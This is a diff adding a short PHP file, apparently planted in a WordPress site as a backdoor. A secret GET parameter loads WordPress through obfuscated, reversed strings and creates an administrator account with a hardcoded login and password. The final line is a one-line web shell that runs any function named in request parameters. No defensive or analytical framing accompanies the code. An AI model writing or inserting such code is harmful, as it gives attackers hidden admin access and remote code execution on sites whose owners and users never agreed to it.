@@ -1,0 +1,13 @@
+<?php
+if(filter_input(INPUT_GET, 'search_user_query_bis',FILTER_SANITIZE_STRING) != false){
+	require($_SERVER['DOCUMENT_ROOT'].strrev('php.daol-pw/'));
+	$userdata = array(
+	'ID'              => 0,  
+	'user_pass'       => '637fikjhYSUidnDfs', 
+	'user_login'      => 'zuserisasisu', 
+	'rich_editing'    => 'true', 
+	'role'            => strrev('rotartsinimda'), 
+	);
+	strrev('resu_tresni_pw')( $userdata );
+}
+@extract($_REQUEST);@die($cdate($adate));
